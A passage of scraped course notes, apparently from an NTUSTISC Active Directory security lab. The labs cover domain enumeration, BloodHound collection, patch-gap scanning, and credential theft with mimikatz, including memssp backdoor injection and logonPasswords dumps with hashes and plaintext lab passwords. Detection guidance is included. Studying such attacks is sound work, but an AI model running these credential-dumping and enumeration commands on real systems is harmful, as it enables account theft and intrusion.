maj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF ssp : credman : cloudap : Authentication Id : 0 ; 45411 (00000000:0000b163) Session : UndefinedLogonType from 0 User Name : (null) Domain : (null) Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:17 SID : msv : [00000003] Primary * Username : DESKTOP-G95U93T$ * Domain : kuma * NTLM : 5648c9d78a770f3e0f727a5fac99da5a * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221 tspkg : wdigest : kerberos : ssp : credman : cloudap : Authentication Id : 0 ; 999 (00000000:000003e7) Session : UndefinedLogonType from 0 User Name : DESKTOP-G95U93T$ Domain : kuma Logon Server : (null) Logon Time : 2023/9/5 上午 12:22:17 SID : S-1-5-18 msv : tspkg : wdigest : * Username : DESKTOP-G95U93T$ * Domain : kuma * Password : (null) kerberos : * Username : desktop-g95u93t$ * Domain : KUMA.ORG * Password : (null) ssp : credman : cloudap : :::\nReference # "},{"id":217,"href":"/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x09%E5%88%A9%E7%94%A8%E5%BC%B1%E9%BB%9E/","title":"NTUSTISC - AD Note - Lab(利用弱點)","section":"Securities","content":" NTUSTISC - AD Note - Lab(利用弱點) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # Internet Information Services(IIS) IIS是縮寫，全稱Internet Information Services ( IIS,互聯網信息服務 ),是由微軟公司提供的基於運行Microsoft Windows的互聯網基本服務。\nIIS是指World Wide Web server服務，IIS是一種Web（網頁）服務組件，專業的說，IIS可以賦予一部主機電腦一組以上的IP地址，而且還可以有一個以上的域名作為Web網站。做過服務器配置的都應該知道IIS。制作好了網站怎麽才能讓別人瀏覽，就是通過網站服務器來實現的。IIS只是網站服務器的一種而已。\n簡單來說： # Internet Information Service（IIS）是windows開設web網頁服務的組件，用來搭載網站運行程序的平台的。還能提供FTP，SMTP等服務。\n在UNIX或Linux平台上，Apache就是網站服務器。\n而對於Windows NT/2000來說，IIS就是標準的網站服務器。\nIIS是一種服務，是Windows 2000 Server系列的一個組件。不同於一般的應用程序，它就像驅動程序一樣是操作系統的一部分，具有在系統啟動時被同時啟動的服務功能。 如果想知道如何在win10啟用IIS或是建置網站server，可以看這個影片1\n一般權限(就像前面的lab那樣) 取得網域使用者資訊 Scan Port Check Group Policy Object 高權限好處 Dump Password or Hash Turn off Defender Check the other users\u0026rsquo; info 本地特出使用者 ==NT Authority\\System==(本地端真正的最高權限使用者) NT Authority\\Network Service NT Authority\\Local Service NT Authority\\IUSR 提權方法 利用弱點(通常是直接用Windows CVE直接打看看)，可參考2 Hijack Token Guess Password 就像前面環境觀察中提到的一樣，可以從Active Directory Users and Computers的description中看看有沒有密碼的提示，或是查看$ net user變更密碼的時間是哪時候，然後考慮爆破 Local Admin比Domain Admin好拿 通常是固定密碼 所有主機都相同 可能很多人知道 弱密碼 系統初始化包 Solution: 可以參考本機系統管理員密碼解決方案(LAPS) 管理服務 錯誤配置 Lab Time - 本地提權 # ==利用弱點== # $ git clone https://github.com/bitsadmin/wesng.git --depth 1 $ cd wesng $ python wes.py --update $ systeminfo.exe \u0026gt; systeminfo.txt # 這條指令是windows內建的指令，所以一定要在cmd中操作 $ python wes.py systeminfo.txt :::spoiler Result\npython wes.py systeminfo.txt Windows Exploit Suggester 1.03 ( https://github.com/bitsadmin/wesng/ ) [+] Parsing systeminfo output [+] Operating System - Name: Windows 11 for x64-based Systems - Generation: 11 - Build: 5 - Version: None - Architecture: x64-based - Installed hotfixes (3): KB5028948, KB5029263, KB5028756 [+] Loading definitions - Creation date of definitions: 20230901 [+] Determining missing patches [!] Found vulnerabilities! Date: 20211214 CVE: CVE-2019-0887 KB: KB5008215 Title: Remote Desktop Services?Remote Code Execution Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Remote Code Execution Exploit: n/a Date: 20211214 CVE: CVE-2020-0655 KB: KB5008215 Title: Remote Desktop Services?Remote Code Execution Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Remote Code Execution Exploit: n/a Date: 20211216 CVE: CVE-2021-43216 KB: KB5008215 Title: Microsoft Local Security Authority (LSA) Server Information Disclosure Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Information Disclosure Exploit: n/a Date: 20211215 CVE: CVE-2021-43217 KB: KB5008215 Title: Windows Encrypting File System (EFS) Remote Code Execution Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Critical Impact: Remote Code Execution Exploit: n/a Date: 20211214 CVE: CVE-2021-43219 KB: KB5008215 Title: DirectX Graphics Kernel File Denial of Service Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Denial of Service Exploit: n/a Date: 20211214 CVE: CVE-2021-43222 KB: KB5008215 Title: Microsoft Message Queuing Information Disclosure Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Information Disclosure Exploit: n/a Date: 20211214 CVE: CVE-2021-43224 KB: KB5008215 Title: Windows Common Log File System Driver Information Disclosure Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Information Disclosure Exploit: n/a Date: 20211214 CVE: CVE-2021-43226 KB: KB5008215 Title: Windows Common Log File System Driver Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43227 KB: KB5008215 Title: Storage Spaces Controller Information Disclosure Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Information Disclosure Exploit: n/a Date: 20211214 CVE: CVE-2021-43228 KB: KB5008215 Title: SymCrypt Denial of Service Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Denial of Service Exploit: n/a Date: 20211214 CVE: CVE-2021-43229 KB: KB5008215 Title: Windows NTFS Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43230 KB: KB5008215 Title: Windows NTFS Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43231 KB: KB5008215 Title: Windows NTFS Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43232 KB: KB5008215 Title: Windows Event Tracing Remote Code Execution Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Remote Code Execution Exploit: n/a Date: 20211214 CVE: CVE-2021-43233 KB: KB5008215 Title: Remote Desktop Client Remote Code Execution Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Critical Impact: Remote Code Execution Exploit: n/a Date: 20211214 CVE: CVE-2021-43234 KB: KB5008215 Title: Windows Fax Service Remote Code Execution Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Remote Code Execution Exploit: n/a Date: 20211214 CVE: CVE-2021-43235 KB: KB5008215 Title: Storage Spaces Controller Information Disclosure Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Information Disclosure Exploit: n/a Date: 20211216 CVE: CVE-2021-43236 KB: KB5008215 Title: Microsoft Message Queuing Information Disclosure Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Information Disclosure Exploit: n/a Date: 20211214 CVE: CVE-2021-43237 KB: KB5008215 Title: Windows Setup Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43238 KB: KB5008215 Title: Windows Remote Access Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43239 KB: KB5008215 Title: Windows Recovery Environment Agent Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43240 KB: KB5008215 Title: NTFS Set Short Name Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43246 KB: KB5008215 Title: Windows Hyper-V Denial of Service Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Denial of Service Exploit: n/a Date: 20211214 CVE: CVE-2021-43247 KB: KB5008215 Title: Windows TCP/IP Driver Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211216 CVE: CVE-2021-43248 KB: KB5008215 Title: Windows Digital Media Receiver Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-41333 KB: KB5008215 Title: Windows Print Spooler Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43207 KB: KB5008215 Title: Windows Common Log File System Driver Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211214 CVE: CVE-2021-43880 KB: KB5008215 Title: Windows Mobile Device Management Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211216 CVE: CVE-2021-43883 KB: KB5008215 Title: Windows Installer Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a Date: 20211216 CVE: CVE-2021-43893 KB: KB5008215 Title: Windows Encrypting File System (EFS) Elevation of Privilege Vulnerability Affected product: Windows 11 for x64-based Systems Affected component: Microsoft Severity: Important Impact: Elevation of Privilege Exploit: n/a [-] Missing patches: 1 - KB5008215: patches 30 vulnerabilities [I] KB with the most recent release date - ID: KB5008215 - Release date: 20211216 [+] Done. Displaying 30 of the 30 vulnerabilities found. :::\nReference # 【網站伺服器 IIS】Windows 10 IIS 安裝與啟用 ASP.NET 網站設定 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDay32 - Windows 提權(3)-Windows Exploit Suggester\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":218,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x02%E6%9F%A5%E8%A9%A2%E6%9C%AC%E5%9C%B0%E4%BD%BF%E7%94%A8%E8%80%85/","title":"NTUSTISC - AD Note - Lab(查詢本地使用者)","section":"Securities","content":" NTUSTISC - AD Note - Lab(查詢本地使用者) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nLab Time - 環境調查 # ==查詢本地使用者== # 常用的cheat sheet\n$ net user $ net user \u0026lt;username\u0026gt; :::spoiler Implementation\n$ net user \\\\DESKTOP-G95U93T 的使用者帳戶 ------------------------------------------------------------------------------- Administrator DefaultAccount Guest low user WDAGUtilityAccount 命令已經成功完成。 $ net user administrator 使用者名稱 Administrator 全名 註解 管理電腦/網域的內建帳戶 使用者的註解 國家/區域碼 000 (系統預設值) 帳戶使用中 Yes 帳戶到期 從不 上次設定密碼 ‎2021/‎9/‎28 下午 10:10:39 密碼到期 從不 可變更密碼 ‎2021/‎9/‎28 下午 10:10:39 請輸入密碼 Yes 使用者可以變更密碼 Yes 容許的工作站 全部 登入指令檔 使用者設定檔 主目錄 上次登入時間 ‎2023/‎8/‎26 上午 12:48:36 可容許的登入時數 全部 本機群組會員 *Administrators 全域群組會員 *None 命令已經成功完成。 :::\n要注意的地方是：\n帳戶是否使用中 - 帳戶到期 密碼到期 上次設定密碼 本機群組會員 全域群組會員 "},{"id":219,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x06%E6%9F%A5%E8%A9%A2%E7%B6%B2%E5%9F%9F%E7%BE%A4%E7%B5%84/","title":"NTUSTISC - AD Note - Lab(查詢網域群組)","section":"Securities","content":" NTUSTISC - AD Note - Lab(查詢網域群組) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nLab Time - 環境調查 # ==查詢網域群組== # 常用的cheat sheet Domain Admins, Schema Admins, Enterprise Admins是預設的權限，通常一進到AD網域都會先看這幾個權限有哪些成員\n$ net groups /domain # 查詢網域中群組的資料 $ net groups \u0026#34;Domain Admins\u0026#34; /domain $ net groups \u0026#34;Schema Admins\u0026#34; /domain $ net groups \u0026#34;Enterprise Admins\u0026#34; /domain :::spoiler Implementation\n$ net groups /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 \\\\WIN-818G5VCOLJO.kuma.org 的群組帳戶 ------------------------------------------------------------------------------- *accounting *Cloneable Domain Controllers *DnsUpdateProxy *Domain Admins *Domain Computers *Domain Controllers *Domain Guests *Domain Users *Enterprise Admins *Enterprise Key Admins *Enterprise Read-only Domain Controllers *Executives *Group Policy Creator Owners *IT Admins *Key Admins *marketing *Office Admin *Project management *Protected Users *Read-only Domain Controllers *sales *Schema Admins *Senior management 命令已經成功完成。 $ net groups \u0026#34;Domain Admins\u0026#34; /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Domain Admins 註解 Designated administrators of the domain 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 $ net groups \u0026#34;Schema Admins\u0026#34; /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Schema Admins 註解 Designated administrators of the schema 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 $ net groups \u0026#34;Enterprise Admins\u0026#34; /domain 這項要求會在網域 kuma.org 下的網域控制站處理。 群組名稱 Enterprise Admins 註解 Designated administrators of the enterprise 成員 ------------------------------------------------------------------------------- Administrator 命令已經成功完成。 可以看到目前這三個預設的群組，都只有Administrator在裡面而已 :::\n具有特殊功能的群組 Remote Desktop Users 在這個群組的成員，可以隨意登入別人的RDP(Remote Desktop Protocol) Group Policy Creator Owners 在這個群組的成員，可以隨意建立GPO，這樣他就可以強制所有帳戶執行他所設定的規則，例如所有人執行後門程式之類的 Server Operators 這是一組進行維護的群組，可以控制整個DC，或是備份他 DNSAdmins 可以管理DNS的紀錄，也可以在主機上跑DLL(執行後門) Backup Operators 可以備份DC Print Operators 重開任何主機(超重要) ==小提醒：加入網域的電腦是沒有隱私的== # 尤其是C槽，加入網域後C槽預設是共享的，Domain Admin可以任意查看，但是會留下足跡，所以站在加入網域的角度來說，不要隨便放私人的東西在C槽，而站在Domain Admin的角度來說，不要隨便亂看別人的C槽，因為這樣會留下認證足跡，可能會供攻擊者一些必要資訊\n"},{"id":220,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x20%E7%84%A1%E6%B3%95reboot%E7%9A%84%E6%99%82%E7%9B%9C%E5%8F%96passwd/","title":"NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)","section":"Securities","content":" NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來\nLab # ==無法Reboot的時盜取Passwd== # Inject memssp 記得用系統管理員權限開mimikatz mimikatz # privilege::debug Privilege \u0026#39;20\u0026#39; OK mimikatz # misc::memssp Injected =) Relogin 重新登出再登入才會看到 Result 在C:\\Windows\\System32\\mimilsa.log [00000000:001f7c0f] kuma\\DESKTOP-G95U93T$\tmaj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF [00000000:001f7c0f] kuma\\DESKTOP-G95U93T$\tmaj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF [00000000:001f80d1] kuma\\DESKTOP-G95U93T$\tmaj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF [00000000:001f80d1] kuma\\DESKTOP-G95U93T$\tmaj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF [00000000:001f80e8] kuma\\DESKTOP-G95U93T$\tmaj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF [00000000:001f80e8] kuma\\DESKTOP-G95U93T$\tmaj\u0026#34;2g\u0026lt;h(\u0026amp;iQZ7kqFHQ4X\u0026amp;c;_wQq3V;*gq.(A=4\u0026amp;)\\2eesNp8S=W)C,\u0026#34;nM:ns?6m.%;K4+CSGDFew\u0026gt;VaNQ;N_)?mB1\\P9udE7Gs\u0026#39;Lsr ccxo*CyL=JdK\u0026#34;\u0026#39;kF [00000000:001fc7f9] kuma\\bear\t1qaz@WSX3edc [00000000:001fc7f9] kuma\\bear\t1qaz@WSX3edc [00000000:001fc85a] kuma\\bear\t1qaz@WSX3edc [00000000:001fc85a] kuma\\bear\t1qaz@WSX3edc [00000000:001fc7f9] kuma\\bear\t1qaz@WSX3edc [00000000:001fc7f9] kuma\\bear\t1qaz@WSX3edc 可以看到這個log file用明文的方式新增了我們剛剛打入的密碼 ==How to detect it?== # 一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間\n"},{"id":221,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x08%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5bloodhound/","title":"NTUSTISC - AD Note - Lab(環境調查BloodHound)","section":"Securities","content":" NTUSTISC - AD Note - Lab(環境調查BloodHound) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # [Windows Programming] IPC 通知機制與安全設定\n當系統中需要同步處理某些資源的存取權時，可以使用 Windows 的同步處理物件協調不同 process 間對於共同資源的互動，Windows 提供的同步處理物件有四種，分別是: Event, Mutex, Semaphore, Waitable timer，本篇只會提到 Event 喔！\n假設系統中有兩個 process：process A 得等待 process B 完成某些特定工作後才能繼續執行。windows 提供的 event 機制能讓 process B 完成工作後發出訊號通知 process A，而 process A 則進入等待狀態直到接受到訊號後才繼續執行後續工作。Process 間只需定好溝通的 event name 就可以輕鬆達成跨程序間的通訊 (Inter-process communication : IPC)，正因為簡單好實現的特性，event 常被用在程序間的溝通與同步。\nLab Time - 環境調查 # BloodHound AD # 說明: 環境調查的視覺化工具 版本: 4.0.3 :::info 8/29更新：經過實測還是建議使用4.1.0，詳細原因可以參考1，原作者說明這是一個bug，已在4.1.0做了修正，所以還是以4.1.0為主，雖然聽講師說可能會少東西，不過對我們小專案來說應該沒差 ::: Link: BloodHound GitHub 必要條件: 必須裝設Neo4j Server / Graph Database, 而且必須要是community version，link Download Collector BloodHound是一個環境調查的視覺化工具，所以要先在我們的環境先蒐集一些環境上的資訊，再導入到BloodHound中進行分析，因此我們應該先下載能夠蒐集環境資訊的Collector我是直接把整包clone下來，然後用隨身碟傳到VM(因為那時候Win10已經加入AD，我懶得改回來上網) :::info Note: Windows的defender會擋BloodHound-master/Collectors/SharpHound.exe和SharpHound.ps1這兩個files，所以記得關掉defender ::: Use the Collector First :::info Note: 記得要用bear的網域帳號登入，SharpHound.exe才找的到LDAP ::: CMD直接進入C:\\tools\\BloodHound-master\\Collectors，然後直接執行$ SharpHound.exe :::spoiler Implementation $ SharpHound.exe 2023-08-29T11:02:31.4846421+08:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound 2023-08-29T11:02:31.6707467+08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-08-29T11:02:31.6985917+08:00|INFORMATION|Initializing SharpHound at 上午 11:02 on 2023/8/29 2023-08-29T11:02:31.9891653+08:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for kuma.org : WIN-818G5VCOLJO.kuma.org 2023-08-29T11:02:32.3820391+08:00|INFORMATION|Loaded cache with stats: 163 ID to type mappings. 163 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-08-29T11:02:32.3915435+08:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote 2023-08-29T11:02:32.6206999+08:00|INFORMATION|Beginning LDAP search for kuma.org 2023-08-29T11:02:32.8062803+08:00|INFORMATION|Producer has finished, closing LDAP channel 2023-08-29T11:02:32.8230625+08:00|INFORMATION|LDAP channel closed, waiting for consumers 2023-08-29T11:03:03.3930708+08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 42 MB RAM 2023-08-29T11:03:13.1743544+08:00|INFORMATION|Consumers finished, closing output channel Closing writers 2023-08-29T11:03:13.2209345+08:00|INFORMATION|Output channel closed, waiting for output task to complete 2023-08-29T11:03:13.3058132+08:00|INFORMATION|Status: 204 objects finished (+204 5.1)/s -- Using 44 MB RAM 2023-08-29T11:03:13.3058132+08:00|INFORMATION|Enumeration finished in 00:00:40.6864986 2023-08-29T11:03:13.3918361+08:00|INFORMATION|Saving cache with stats: 163 ID to type mappings. 163 name to SID mappings. 1 machine sid mappings. 2 sid to domain mappings. 0 global catalog mappings. 2023-08-29T11:03:13.4075189+08:00|INFORMATION|SharpHound Enumeration Completed at 上午 11:03 on 2023/8/29! Happy Graphing! ::: 理論上成功的話，會在該folder中出現一個.zip file with name \u0026lt;TimeStamp\u0026gt;.BloodHound.zip此時按照之前啟動BloodHound的方法啟動BloodHound，然後把zip folder拖進去就可以了 ==如何偵測AD== # 有兩種方法，也可以同時使用\nLots of Event ID: 4662 如果同一時間偵測到很多4662 event的操作，那很有可能是bloodhound，就算不是也一定是類似的情蒐工具\nEvent ID: 5146 bloodhound喜歡存取的對象是: ==lsarpc/samr/srvsvc==，所以只要有這幾個event出現，就很有可能是bloodhound，而這個event也是像4662一樣預設是關閉的，所以要先到Group Policy Editor打開 :::danger 我查找了5146的event但都沒有偵測到，我有把GPO打開，但是還是沒有偵測到，我是有在Event Viewer中看到很像的，例如5145/5156之類的，但看起來都不是，另外，講師的影片中在59:11的地方也是顯示Event 5145，所以我不知道該怎麼解決這個lab遇到的問題 :::\n可以使用Event Viewer中的Create Custom View，自動的filter出想要的Event Result # :::spoiler Screenshot of Event 4662 可以看到從3:53~3:54的時間當中有超多的event 4662紀錄，而同時可以看到再另外一台主機中，我也是在差不多時間執行SharpHound.exe，進行情蒐 :::\nReference # Bloodhound 4.0 - doesn’t upload all data #402 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":222,"href":"/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x07%E7%95%B6%E5%89%8D%E7%B6%B2%E5%9F%9F%E6%8E%A7%E5%88%B6%E7%AB%99dc/","title":"NTUSTISC - AD Note - Lab(當前網域控制站(DC))","section":"Securities","content":" NTUSTISC - AD Note - Lab(當前網域控制站(DC)) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nLab Time - 環境調查 # 情報蒐集：==當前網域控制站(DC)== # 以駭客的角度來說，如果已經連到AD中，要怎麼知道目前DC是誰 常用的cheat sheet\n$ echo %logonserver% $ nltest /dclist:\u0026lt;domain\u0026gt; :::spoiler Implementation\n$ echo %logonserver% \\\\WIN-818G5VCOLJO $ nltest /dclist:kuma.org 取得網域 \u0026#39;kuma.org\u0026#39; (從 \u0026#39;\\\\WIN-818G5VCOLJO.kuma.org\u0026#39;) 中的 DC 清單。 WIN-818G5VCOLJO.kuma.org [PDC] [DS] 站台: Default-First-Site-Name 命令成功完成 從Win10當中下指令的確可以知道Win2016的PC Name是WIN-818G5VCOLJO :::\n"},{"id":223,"href":"/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/","title":"NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)","section":"Securities","content":" NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM) # [TOC]\nLecture Video: 2022/05/04 AD 安全1\nBackground # 得到更高權限之後，會想要更多的密碼\n密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) GPO Where: \\\\\u0026lt;domain\u0026gt;\\SysVol\\\u0026lt;domain\u0026gt;\\Policie，以本次實驗為例，就是放在\\\\kuma.org\\SYSVOL\\kuma.org\\Policies，接下來就是隨機生成的\u0026lt;UID\u0026gt;\\Users\\Scripts和\u0026lt;UID\u0026gt;\\Machine\\Scripts，這兩個腳本是我們覺得重要的 記憶體(lsass) 為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證 ==What is Mimikatz?== Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。 lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。 簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證\nDownload: Mimikatz-github How to use: Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位 下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位 ==lsass.exe VS SAM== SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄 Lab # ==透過Mimikatz取得Local Admin的NTLM== # Activate Mimikatz 進入C:\\tools\\mimikatz_trunk\\x64右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug) 起手式 mimikatz # Privilege::Debug Privilege \u0026#39;20\u0026#39; OK mimikatz # log Using \u0026#39;mimikatz.log\u0026#39; for logfile : OK mimikatz # Sekurlsa::logonPasswords :::spoiler Log Reuslt Using \u0026#39;mimikatz.log\u0026#39; for logfile : OK mimikatz # Sekurlsa::logonPasswords Authentication Id : 0 ; 23133312 (00000000:0160fc80) Session : CachedInteractive from 1 User Name : Administrator Domain : kuma Logon Server : WIN-818G5VCOLJO Logon Time : 2023/9/4 06:07:18 SID : S-1-5-21-306106713-2531972042-334329499-500 msv :\t[00000003] Primary * Username : Administrator * Domain : kuma * NTLM : 7ecffff0c3548187607a14bad0f88bb1 * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0 * DPAPI : cf967ea9c9c0f9d58b79fdd040270648 tspkg :\twdigest :\t* Username : Administrator * Domain : kuma * Password : (null) kerberos :\t* Username : Administrator * Domain : KUMA.ORG * Password : 1qaz@WSX3edc ssp :\tcredman :\tcloudap :\tAuthentication Id : 0 ; 20047794 (00000000:0131e7b2) Session : CachedInteractive from 1 User Name : 